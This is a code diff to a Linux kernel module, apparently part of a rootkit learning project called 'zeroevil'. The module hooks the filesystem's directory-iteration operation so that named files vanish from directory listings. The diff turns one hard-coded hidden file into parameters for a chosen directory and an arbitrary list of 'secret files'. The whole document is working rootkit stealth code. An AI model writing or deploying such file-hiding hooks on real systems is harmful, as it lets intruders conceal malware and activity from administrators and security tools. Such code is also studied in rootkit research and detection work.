@@ -25,13 +25,21 @@
 # include <linux/fs.h> // filp_open, filp_close.
 # endif // CPP
 
+//# define DEBUG
 # include "zeroevil/zeroevil.h"
 
 
 MODULE_LICENSE("GPL");
 
-# define ROOT_PATH "/usr/share/"
-# define SECRET_FILE "kernel-kit"
+static char root_dir[128] = {"/"};
+static char *secret_files[128];
+static int secret_files_c;
+
+module_param_string(dir, root_dir, sizeof(root_dir), 0644);
+MODULE_PARM_DESC(dir, "parent directory");
+
+module_param_array_named(files, secret_files, charp, &secret_files_c, S_IRUGO);
+MODULE_PARM_DESC(files, "secret files");
 
 int
 (*real_iterate)(struct file *filp, struct dir_context *ctx);
@@ -52,7 +60,7 @@ init_module(void)
 {
     fm_alert("%s\n", "Greetings the World!");
 
-    set_file_op(iterate, ROOT_PATH, fake_iterate, real_iterate);
+    set_file_op(iterate, root_dir, fake_iterate, real_iterate);
 
     if (!real_iterate) {
         return -ENOENT;
@@ -67,7 +75,7 @@ cleanup_module(void)
 {
     if (real_iterate) {
         void *dummy;
-        set_file_op(iterate, ROOT_PATH, real_iterate, dummy);
+        set_file_op(iterate, root_dir, real_iterate, dummy);
     }
 
     fm_alert("%s\n", "Farewell the World!");
@@ -89,9 +97,12 @@ int
 fake_filldir(struct dir_context *ctx, const char *name, int namlen,
              loff_t offset, u64 ino, unsigned d_type)
 {
-    if (strcmp(name, SECRET_FILE) == 0) {
-        fm_alert("Hiding: %s", name);
-        return 0;
+    int i;
+    for (i=0; i<secret_files_c; i++) {
+        if (strcmp(name, secret_files[i]) == 0) {
+            fm_alert("Hiding: %s", name);
+            return 0;
+        }
     }
 
     /* pr_cont("%s ", name); */
